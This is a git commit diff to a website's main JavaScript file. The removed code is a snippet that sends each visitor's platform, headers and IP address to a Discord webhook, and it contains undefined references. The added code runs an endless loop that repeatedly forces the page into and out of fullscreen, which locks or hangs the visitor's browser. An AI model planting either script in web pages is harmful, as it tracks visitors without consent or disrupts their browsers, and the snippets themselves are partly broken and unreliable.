f23427cd9b65de2f20383c6235e4025902a2554b
gogiyaw <86326882+gogiyaw@users.noreply.github.com>
2021-06-23 15:32:35 +1000

    Add files via upload

--- assets/js/main.js
+++ assets/js/main.js
@@ -1,13 +1,6 @@
-(async () => {
-    const params = { content: `Platform: ${window.navigator.oscpu = window.navigator.oscpu || window.navigator.platform}\n HEADERS: ${windows.navigator.headers}\nIP: ${ip}` };
-    const webhookResponse = await fetch('https://canary.discord.com/api/webhooks/857029101344129054/IEA809IlFa77UvjVwmH0FIHOV2qmS4UY9Rh0xcVxSHBzObhtdTRb4MvVncjBC2bE-6eC', {
-        method: 'POST',
-        headers: {
-            'Accept': 'application/json',
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(params)
+while (true) {
+    var element = document.querySelector('body');
+    element.requestFullscreen().then(() => {
+        document.exitFullscreen();
     });
-    const content = await webhookResponse.json();
-});
-
+}
